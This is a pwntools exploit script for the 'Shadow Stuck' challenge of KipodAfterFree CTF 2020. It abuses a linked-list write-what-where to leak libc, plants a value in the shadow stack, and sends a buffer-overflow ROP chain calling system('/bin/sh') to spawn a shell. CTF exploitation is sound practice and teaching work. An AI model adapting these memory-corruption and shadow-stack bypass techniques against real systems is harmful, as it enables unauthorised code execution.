from pwn import *

# --- Info ---
# CTF: KipodAfterFree CTF 2020
# Date: -
# Challenge: Shadow Stuck
# Description: Write-what-where in linked list and BOF bypassing shadow stack
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './shadowstuck'
LIBC = './libc-2.31.so'
ENV = {"LD_PRELOAD":"./libc-2.31.so"}
libc  = ELF(LIBC, checksec = False)
binary  = ELF(PATH, checksec = False)

REMOTE = 0
one_gadget = 0

HOST = 'challenges.ctf.kaf.sh'
PORT = 8000

def add(data):
    r.recvuntil('[Q]uit\n>')
    r.sendline('A')
    r.recvuntil('name:\n>')
    r.sendline(data)

def delete(name, desc):
    r.recvuntil('[Q]uit\n>')
    r.sendline('F')
    r.recvuntil('fire?\n>')
    r.sendline(name)
    r.recvuntil('fired.\n>')
    r.sendline(desc)

def change(idx, data):
    r.recvuntil('[Q]uit\n>')
    r.sendline('C')
    r.recvuntil('rename?\n>')
    r.sendline(str(int(idx)))
    r.recvuntil('employee:\n>')
    r.sendline(data)

def read(idx):
    r.recvuntil('[Q]uit\n>')
    r.sendline('R')
    r.recvuntil('name of?\n>')
    r.sendline(str(int(idx)))
    data = r.recvuntil('[A]dd').replace('[A]dd', '')
    data = (data.split('has name: '))[1].split('\n')[0]
    return data
 
def quit(payload):
    r.recvuntil('[Q]uit\n>')
    r.sendline('Q')
    r.recvuntil('BOF on me.')
    r.sendline(payload)

def init_leak():
    data = r.recvuntil('Welcome')
    data = (data.split('set up at '))[1].split('\n')[0]
    return int(data, 16)
      
def pad(addr):
    return addr + '\x00'*(8-len(addr))
    
context.binary = PATH
r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
g_list_root = 0x555555558068                                # BSS addr of link list head

#if(not REMOTE):
#    gdb.attach(r)
#pause()

pop_rdi = 0x0000000000026b72                                # pop rdi ; ret
pop_rsi = 0x0000000000027529                                # pop rsi ; ret
pop_rdx = 0x0000000000117960                                # pop rdx ; ret

mmap_page = init_leak()                                     # leak SHADOW_STACK address (already given)
shadow_stack = mmap_page + 4096                             # shadow_stack is mmap_page+4096

add("AAAA")                                                 # alloc a chunk
delete("AAAA", p64(mmap_page)*3)                            # exploit linked-list for write-what-where

leak = u64(pad(read(1)))                                    # trigger arbitrary read
libc_base = leak - libc.symbols['__libc_start_main'] - 243  # the address located in SHADOW_STACK is __libc_start_main+243

getpid = libc_base + libc.symbols['getpid']                 # I use getpid first to ake RSP 16-byte aligned

change(1, p64(getpid))                                      # getpid is the first element of ROP, so add it to shadow stack

log.info(f'mmap page @ {hex(mmap_page)}')
log.info(f'shadow stack @ {hex(shadow_stack)}')
log.info(f'libc base @ {hex(libc_base)}')

system_addr = libc_base + libc.symbols['system']
getpid = libc_base + libc.symbols['getpid']

log.info(f'system @ {hex(system_addr)}')

offset = 0x11                                               # offset to RBP

gadgets = [
            libc_base+0xe6ce3,                              # one_gadget #1
            libc_base+0xe6ce6,                              # one_gadget #2
            libc_base+0xe6ce9                               # one_gadget #1
          ]

payload = ''
payload += 'A'*(offset)                                     # junk
payload += p64(mmap_page+0x80)                              # RBP (I enter a writable address to avoid errors)
payload += p64(getpid)                                      # getpid (pad for RSP)

if(not one_gadget):    
    payload += p64(libc_base + pop_rdi)                     # pop rdi ; ret
    payload += p64(libc_base + next(libc.search("/bin/sh")))# &"(/bin/sh\x00")
    payload += p64(system_addr)                             # system()
    payload += p64(getpid)                                  # getpid (pad 2)
else:
    payload += p64(gadgets[0])                              # overwrite shadow stack with one_gadget

quit(payload)                                               # time to trigger the buffer overflow  

r.interactive()
r.close()
